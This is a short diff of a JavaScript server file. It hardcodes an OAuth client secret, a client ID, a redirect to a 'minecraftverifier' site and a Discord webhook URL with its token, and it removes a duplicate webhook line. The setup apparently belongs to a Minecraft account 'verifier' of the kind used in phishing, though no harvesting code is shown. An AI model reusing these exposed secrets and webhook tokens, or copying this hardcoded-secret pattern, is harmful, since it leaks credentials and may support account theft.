@@ -3,7 +3,6 @@ const secret_value = '831ad5f6-4da9-48bb-b9aa-a618ba1f419c'
 const client_id = 'f0606008-2fc6-48a0-adf9-db9fad90c8cf'
 const redirect_uri = 'https://minecraftverifier.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1152495779227910204/bmOI_8eXiEfusZfUYdBcfZlo7S4ul_deKgM6B5asjLKx1ovM0RaoEquD433ZflM89ng3'
-const webhook_url = 'https://discord.com/api/webhooks/1152506500653269052/PA4IE6R3Y4UuIwuYF5n3eqmk4RnsU_RAxAT7Aon-9NF-IV4dtxpfuIo69vxAA7nTTt1j'
 //Requirements
 const axios = require('axios')
 const express = require('express')
